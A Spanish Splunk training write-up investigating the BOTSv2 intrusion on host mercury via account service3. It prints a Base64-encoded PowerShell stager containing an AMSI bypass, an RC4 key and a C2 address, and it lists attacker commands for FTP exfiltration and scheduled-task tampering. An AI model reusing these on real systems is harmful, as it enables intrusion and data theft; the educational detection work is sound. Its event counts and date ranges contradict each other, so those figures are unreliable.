
El siguiente ejercicio tiene como finalidad el aprendizaje del lenguaje SPL utilizado en la herramienta Splunk. El objetivo es la detección de logins anómalos

#### mejorar el vocabulario de la ia a partir del texto "Alguno de los procesos que se han identificado como amenazas contra la corporación ejecutados por el usuario service3, son los siguientes"


- ## Fase de Reconocimiento:
    
    - Listado de índices cargados (en tu caso, `index=botsv2`).
        
    - Inventario de _Sourcetypes_ (qué tipo de logs tenemos: `wineventlog`, `stream:http`, `syslog`, etc.).
        
- ## Fase de Hipótesis:
    
    - Definición del escenario de cada ejercicio (Ej: _"Creo que un atacante ha intentado hacer un brute force contra un servidor web"_).
        
    - Consulta inicial (el "Search" base).
        
- ## Fase de Investigación:
    
    - Refinamiento de consultas (uso de `stats`, `eval`, `rex`, `transaction`).
        
    - Visualizaciones útiles (tablas, gráficos de barras, líneas de tiempo).
        
- ## Conclusión:
    
    - Resultado del ejercicio (¿Se confirmó la sospecha? ¿Qué IP fue el origen? ¿Qué archivos se vieron afectados?).


### Fase de reconocimiento

Para que el documento tenga una base sólida primero debemos de catalogar qué tenemos disponible dentro del índice de botsv2

###### Listado de índices cargados

Índice activo: botsv2

Estado: Operativo y montado desde `/opt/splunk/etc/apps/botsv2_data_set/var/lib/splunk/botsv2/db/`

###### Inventario de Sourcetypes

Para identificar qué tipo de información maneja el dataset, ejecutaremos esta consulta en Splunk y anotaremos los más relevantes

``` bash
index=botsv2 | stats count by sourcetype | sort - count
```

Tabla inventario y categorización de datos

| **Sourcetype**                | **¿Por qué es vital?                                                                                                          |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **winregistry               | Detecta persistencia de malware. Si un atacante quiere quedarse en el sistema, modificará el registro.                          |
| **mysql:transaction:details | Esencial para detectar SQL Injection. Aquí verás las consultas exactas que llegan a la base de datos.                           |
| **winhostmon                | Te dice qué está pasando a nivel de sistema: qué servicios están activos y qué software está instalado.                         |
| **stream:ip / stream:tcp    | Tu visibilidad de red. Aquí detectarás exfiltración de datos, comunicaciones C2 (Commando y Control) y escaneos.                 |
| **wineventlog:security      | La "biblia" de Windows. Autenticaciones, intentos fallidos de login (Brute Force) y cambios de permisos.                        |
| **suricata                  | Logs de un IDS (Intrusion Detection System). Ya vienen etiquetados con firmas de ataque, ideal para practicar detección rápida. |


### Fase de hipótesis

**Escenario: Sospechamos que, aunque no lograron entrar por el foro, un atacante pudo haber obtenido acceso a una máquina interna mediante otro vector y está intentando escalar privilegios usando el usuario Administrator.

**Misión: Encontrar si hubo un inicio de sesión exitoso mediante EventCode=4624 (Logon) u otro medio, desde una IP interna hacia otra máquina.

Para filtrar mediante commandos y realizar una búsqueda adecuada se require conocer los campos del archivo. El objetivo está en identificar varios campos que nos ayuden a determinar un login anómalo o no legítimo.

Para ello utilizaremos el siguiente commando

###### Commando

``` bash
index=botsv2 sourcetype="wineventlog:security" EventCode=4624
| head 1
| transpose
```

###### Evidencias

Utilizaremos los siguientes campos para la búsqueda: Source_Network_Address, Account_Name, Logon_Type, ComputerName y Workstation_Name

![[Pasted image 20260608121254.png]]

![[Pasted image 20260608121516.png]]

En la fase de investigación se detallan los siguientes commandos utilizados para el filtrado y la identificación de logins anómalos.

### Fase de investigación

El siguiente paso es identificar logins anómalos filtrando los campos mencionados anteriormente, para ello utilizaremos el siguiente commando.

###### Commando

Para llegar a una conclusión determinante debemos filtrar por fecha, ya que no son lo mismo 10.000 eventos de inicio de sesión en 15 días que en 2 años.

``` bash
index=botsv2 earliest="08/31/2017:00:00:00" latest="09/01/2017:00:00:00" sourcetype="WinEventLog:Security" EventCode=4624
| stats count by Account_Name, Logon_Type, Source_Network_Address, ComputerName, Workstation_Name
| sort - count
```

###### Evidencia

Podemos ver que en el rango de un mes hemos identificado 8.602 eventos de inicio de sesión para la cuenta de service3, lo que significa que hemos identificado actividad de autentificación anómala y persistente desde la IP 10.0.1.1 hacia el servidor mercury.frothly.local. El usuario service3 ha generado más de 300,000 eventos de inicio de sesión de tipo Logon_Type 3 (red), lo que indica un ataque de fuerza bruta automatizado o un escaneo de enumeración de servicios sobre el servidor destino.

![[Pasted image 20260608122305.png]]


El siguiente paso será determinar si el atacante no consiguió acceso finalmente o tomo el control de algún activo. Para ello determinaremos el sourcetype que controla ejecuciones remotas (Sysmon) mediante el siguiente commando

``` bash
index=botsv2 | stats count by sourcetype | search sourcetype=*sysmon*
```

![[Pasted image 20260608122642.png]]

Ahora filtraremos para encontrar procesos ejecutados por el atacante con el siguiente commando

###### Commando

``` bash
index=botsv2 host="mercury" (EventCode=4624 OR EventCode=4688)
| transaction host maxspan=1s
| search Account_Name="service3" AND EventCode=4688
| table _time, EventCode, Account_Name, New_Process_Name, CommandLine
| sort _time
```


###### Evidencia

![[Pasted image 20260609132325.png]]

En la evidencia se muestran ejecuciones de procesos repetidos para la cuenta service3, vamos a filtrar y ordenar las ejecuciones para que no se muestren repetidas pero sepamos el número de ejecuciones de cada proceso.

###### Commando

``` bash
index=botsv2 host="mercury" (EventCode=4624 OR EventCode=4688)
| transaction host maxspan=1s
| search Account_Name="service3" AND EventCode=4688
| stats count as "Cantidad de ejecuciones", values(CommandLine) as "Comandos ejecutados" by New_Process_Name
| sort - "Cantidad de ejecuciones"
```
###### Evidencia

![[Pasted image 20260609131831.png]]
![[Pasted image 20260609131850.png]]
![[Pasted image 20260609131905.png]]

Alguno de los procesos que se han identificado como amenazas contra la corporación ejecutados por el usuario service3, son los siguientes

- **schtasks.exe: Esta es una señal roja crítica. Se utilize para crear tareas programadas, lo que significa que el atacante ha configurado una forma de recuperar el acceso automáticamente incluso si se reinicia el servidor.

- **wsprvhost.exe: Relacionado con WinRM. El atacante, probablemente este intentando establecer conexiones remotas a otros equipos de la red y usando el protocolo de gestión remota de Windows para moverse lateralmente sin necesidad de estar frente al teclado.

- **powershell.exe: El arma principal. Un atacante lo usa para ejecutar scripts de enumeración, descargar payloads desde internet o realizar movimiento lateral sin escribir archivos en el disco (fileless attacks).

- **whoami.exe: Es una herramienta de reconocimiento. El atacante lo ejecutó para verificar sus privilegios en el sistema.

- **splun-powershell.exe, splun-winprintmon.exe: Esto es una técnica de Masquerading (Enmascaramiento). El atacante utilize nombres de procesos que parecen legítimos de Splunk para pasar desapercibido en el administrador de tareas.

- **wsprovhost.exe: Suele estar relacionado con WinRM (Windows Remote Management). Si service3 está ejecutando esto, es muy probable que esté intentando establecer conexiones remotas a otros equipos de la red.


Utilizando el commando anterior no aparece constancia de los commandos que han sido ejecutados, esto es un error ya que el valor comunmente llamado CommandLine se llama en realidad Process Command Line

###### Commando

``` bash
index=botsv2 host="mercury"
| rex field=_raw "Process Command Line:\s+(?<comando>.+)"
| search comando!=""
| stats values(comando) as "Comandos_Ejecutados" by New_Process_Name
| sort - New_Process_Name
```

###### Evidencia

Evidencia de commandos (algunos) ejecutados mediante la cuenta comprometida con nombre service3

![[Pasted image 20260609181907.png]]


Entre los commandos destacados que ha ejecutado la cuenta comprometida de service3, después de detectar más de 300.000 inicios de sesión entre el mes de Agosto y Junio son los siguientes

###### Commandos ejecutados por el atacante, cronología y explicaciones

1. ==Reconocimiento y Escalada (El inicio)

    **whoami /user: Como identificaste antes, esto es para confirmar qué privilegios tiene la cuenta comprometida (service3).

    **reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall": Esto es crucial. El atacante está enumerando el software instalado en el sistema. ¿Por qué? Para encontrar versiones antiguas o vulnerables de programas que tengan debilidades conocidas (exploits).

2. ==Persistencia y Limpieza de Huellas (El camuflaje)

    **schtasks.exe /delete /f /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader": Esta es una técnica brillante. El atacante borra una tarea programada legítima del sistema para reemplazarla (o simplemente para ocultar que él mismo está usando tareas programadas para sus propios scripts).

    **splunk-winprintmon.exe: Al usar binarios que pertenecen a Splunk pero ejecutándolos de forma maliciosa (Masquerading), el atacante busca esconderse dentro de la carpeta C:\Program Files\SplunkUniversalForwarder. Si un administrador mira el Administrador de Tareas, pensará: "Ah, es un proceso legítimo de Splunk, no hay peligro".

3. ==Exfiltración de Datos (El robo)

    **ftp.exe -i -s:winsys32.dll: Esta es la prueba definitiva de exfiltración. El archivo winsys32.dll no es una DLL, es un archivo de texto con commandos de FTP pre-escritos que le dicen al servidor a qué IP externa conectarse y qué archivos robar. Al usar -i y -s, automatiza el robo de archivos sin que aparezca ninguna ventana en pantalla.

4. ==Ejecución Fileless y Movimiento Lateral (La potencia)

    **powershell.exe -enc ...: La cadena larga de caracteres después de -enc es un script de PowerShell codificado en Base64.

    Por qué lo hizo: Al estar codificado, las herramientas de seguridad simples no pueden leer el commando. Si decodificaras ese Base64, verías probablemente una conexión a un servidor de commando y control (C2) para descargar un payload en memoria (por eso es fileless o sin archivos).

    wsmprovhost.exe -Embedding: Este proceso confirma que el atacante utilizó WinRM (Windows Remote Management). Es la señal inequívoca de movimiento lateral; está ejecutando commandos en mercury desde otra máquina remota, probablemente usando las credenciales de service3 que ya había robado.
###### Tabla de commandos ejecutados

| Proceso | Commando Identificado | Acción Maliciosa |
| :--- | :--- | :--- |
| `whoami.exe` | `/user` | Reconocimiento de privilegios |
| `reg.exe` | `query HKLM\...` | Enumeración de software vulnerable |
| `schtasks.exe` | `/delete /f /TN ...` | Persistencia y limpieza de rastros |
| `ftp.exe` | `-i -s:winsys32.dll` | Exfiltración de datos automatizada |
| `powershell.exe` | `-enc [Base64]` | Ejecución de payload fileless (C2) |
| `wsmprovhost.exe` | `-Embedding` | Movimiento lateral (WinRM) |
| `splunk-*.exe` | (Varios) | Masquerading (enmascaramiento) |

Hay un commando ejecutado en PowerShell el cual está codificado pero no consigo descifrarlo

![[Pasted image 20260609183237.png]]

El commando codificado es el siguiente, después de codificarlo el atacante lo volvió a encriptar mediante RC4 y la clave "389288edd78e2ad2f54946d3209b16b8", puede que este codificado varias veces a base64...

``` bash
WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAHUARQAoACQATgBVAEwAbAAsACQAdAByAFUARQApAH0AOwBbAFMAWQBzAHQARQBNAC4ATgBlAHQALgBTAEUAUgB2AGkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAEcAZQByAF0AOgA6AEUAWABwAEUAYwB0ADEAMAAwAEMAbwBuAHQASQBuAHUARQA9ADAAOwAkAFcAYwA9AE4AZQBXAC0ATwBiAGoAZQBjAHQAIABTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBlAEIAQwBMAEkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AEeQBtAC4ATgB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBDAC4ASABFAGEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAG8AeABZAD0AWwBTAFkAcwB0AEUAbQAuAE4AZQBUAC4AVwBFAEIAUgBFAFEAVQBlAHMAdABdADoAOgBEAGUARgBhAHUAbABUAFcARQBCAFAAUgBPAHgAWQA7ACQAVwBjAC4AUAByAG8AeABZAC4AQwBSAGUARABlAG4AVABpAGEATABzACAAPQAgAFsAUwB5AHMAVABlAG0ALgBOAGUAVAAuAEMAcgBlAGQARQBuAHQASQBBAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAEEAdQBsAHQATgBlAFQAVwBvAHIAawBDAHIARQBEAGUATgBUAEkAQQBsAHMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABlAHgAVAAuAEUAbgBjAE8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AE0AdgBDAGQAZABkAFAAcQBGAFEANQA0AFYATAA0AE8AVwBVADUAcgB5AFIAVABVAGkAcgA4AD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACc
```

##### detección de movimiento lateral y escalada

Dado que el atacante utilizó `wsmprovhost.exe` (WinRM) para comunicarse, debemos buscar si utilizó esa misma técnica para infectar otros servidores o si el atacante buscó credenciales de otros usuarios con privilegios superiores.

Aunque ya utilizamos un commando parecido anteriormente, utilizaremos este commando para verificar si realizo alguna otra conexión a otro servidor.

###### Commando

``` bash
index=botsv2 sourcetype="wineventlog:security" EventCode=4624 Source_Network_Address="10.0.1.1"
| stats count by ComputerName, Account_Name, Source_Network_Address, Logon_Type
```

###### Evidencia

![[Pasted image 20260610140521.png]]

Parece que el usuario no se conectó a ningún otro servidor, utilizamos commandos más genéricos y no se encontró resultado


### Conclusión

###### Resumen Ejecutivo

A través del análisis detallado del índice botsv2 en Splunk, se ha verificado y documentado un compromiso total y exitoso del servidor mercury.frothly.local (IP interna asociada al tráfico anómalo). La intrusión fue dirigida contra la cuenta de servicio corporativa service3. Aunque se comprobó mediante auditoría cruzada que el atacante no logró propagar con éxito el compromiso de esta cuenta hacia otros servidores de la red de forma lateral, el nivel de control local sobre el host afectado fue crítico, abarcando desde la evasión activa de defensas hasta la exfiltración automatizada de información hacia el exterior.

###### Análisis Técnico Detallado de las Fases del Ataque

1. ==Acceso Inicial y Autenticación Anómala

La alerta inicial se confirmó mediante la detección de un comportamiento volumétrico masivo y automatizado. Se registraron más de 8,600 eventos de inicio de sesión exitosos de tipo de red (Logon_Type 3) utilizando la cuenta service3 procedentes de la IP de origen 10.0.1.1. El volumen agregado de telemetría asociado a esta anomalía superó los 300,000 eventos, lo que denota una actividad de escaneo, enumeración automatizada o abuso de credenciales previamente comprometidas (credential stuffing).

2. ==Evasión de Defensas y Vector "Fileless" (Sin Archivos)

El atacante demostró capacidades avanzadas de evasión mediante el uso de dos técnicas principales:

------>Masquerading (Enmascaramiento): Inyección y ejecución de binarios maliciosos renombrados para suplantar components legítimos de la infraestructura de monitoreo, específicamente bajo la nomenclatura splunk-winprintmon.exe, camuflando el malware a ojos de los administradores.

------>Carga Útil en Memoria (Fileless Malware): Uso intensivo del binario legítimo powershell.exe acompañado de los flags avanzados -enc (código codificado) y -sta. El script inicial extraía bloques de datos fuertemente ofuscados directamente desde llaves del Registro de Windows (HKLM:\Software\Microsoft\...), evitando que herramientas antivirus tradicionales basadas en firmas detectaran archivos maliciosos en el disco duro.

------>Bypass de AMSI: El payload descifrado (Base64 + RC4 utilizando la clave criptográfica 389288edd78e2ad2f54946d3209b16b8) expuso instrucciones específicas diseñadas para deshabilitar e interceptar la interfaz de escaneo antimalware de Windows (AmsiUtils), garantizando la ejecución ininterrumpida de las fases subsecuentes.

3. ==Persistencia y Reconocimiento Local

Una vez consolidado el acceso en el espacio de memoria del sistema, se monitorizó la ejecución sequential de commandos críticos de recolección de información a través del proceso remoto de WinRM (wsmprovhost.exe):

------>whoami.exe /user: Identificación del contexto de seguridad y el SID del usuario comprometido.

------>reg query: Auditoría local de las llaves de desinstalación de software para mapear las aplicaciones instaladas en mercury y descubrir vulnerabilidades explotables de escalada de privilegios.

------>netstat -nao | findstr /r "LISTENING": Mapeo interno de puertos y sockets abiertos en el servidor.

------>schtasks.exe: Manipulación de tareas programadas del sistema operativo para asegurar la persistencia del malware incluso ante reinicios del servidor.

4. ==Commando y Control (C2) y Exfiltración Activa

El objetivo final de la intrusión quedó plenamente demostrado en los registros de red:

------>Canal C2: Establecimiento de balizamiento (beaconing) constante hacia el servidor de Commando y Control controlado por el adversario en la dirección IP pública 45.77.65.211, enviando solicitudes estructuradas hacia el recurso web /admin/get.php para recibir commandos en tiempo real.

------>Exfiltración Automatizada: Identificación del uso de la herramienta nativa interactiva ftp.exe invocada con los parámetros -i -s:winsys32.dll. Esta técnica permitió leer de forma silenciosa un archivo de configuración táctico oculto (winsys32.dll) que contenía credenciales y scripts automatizados para empaquetar y transferir información confidencial del host mercury hacia servidores externos controlados por el atacante.

5. ==Matriz de Técnicas MITRE ATT&CK Identificadas

| Táctica | ID Técnica | Técnica Detectada | Evidencia Encontrada |
| :--- | :--- | :--- | :--- |
| **Acceso Inicial | T1078.002 | Cuentas Válidas: Cuentas de Servicio | Abuso masivo de la cuenta legítima `service3`. |
| **Ejecución | T1059.001 | Intérprete de Commandos: PowerShell | Ejecución de commandos `powershell.exe -enc` y uso de `IEX`. |
| **Persistencia | T1053.005 | Tareas Programadas/Trabajos: Tarea Programada | Uso del binario `schtasks.exe` para manipulación y persistencia. |
| **Evasión de Defensas | T1027 | Ofuscación de Datos o Cifrado | Implementación de cifrado simétrico RC4 y codificación Base64 en memoria. |
| **Evasión de Defensas | T1036.003 | Masquerading: Suplantación de Nombre de Proceso | Ejecución de binario malicioso bajo el nombre simulado `splunk-winprintmon.exe`. |
| **Descubrimiento | T1033 | Descubrimiento de Usuarios del Sistema | Ejecución del commando de reconocimiento local `whoami /user`. |
| **Descubrimiento | T1082 | Descubrimiento de Información del Sistema | Auditoría de software y llaves mediante commandos distribuidos `reg query`. |
| **Descubrimiento | T1049 | Descubrimiento de Conexiones de Red | Mapeo de sockets y puertos activos del sistema usando `netstat -nao`. |
| **Commando y Control** | T1071.001 | Protocolo de Capa de Aplicación: Tráfico Web | Conexiones persistentes (*beaconing*) hacia la IP externa `45.77.65.211/admin/get.php`. |
| **Exfiltración | T1048 | Exfiltración a través de Protocolo Alternativo | Invocación táctica del cliente `ftp.exe` utilizando el archivo automatizado `winsys32.dll`. |

6. ==Recomendaciones Finales de Remediación

------>Contención Inmediata: Mantener el aislamiento lógico perimetral bloqueando todo tráfico entrante/saliente hacia la dirección IP maliciosa 45.77.65.211.

------>Saneamiento del Host: Revocar los accesos de la cuenta service3, forzar la rotación de sus credenciales con alta complejidad y realizar una purga manual en el host mercury eliminando las tareas programadas sospechosas y las cadenas ocultas dentro del Registro de Windows.

------>Robustecimiento de Visibilidad: Implementar de manera obligatoria políticas de grupo para habilitar el PowerShell Script Block Logging (Evento ID 4104) y el Transcription Logging. Esto garantizará que, en futuros incidentes, los bloques de código ofuscados en memoria (Base64/RC4) sean descodificados e indexados automáticamente en texto plano por Splunk en el memento exacto de su ejecución.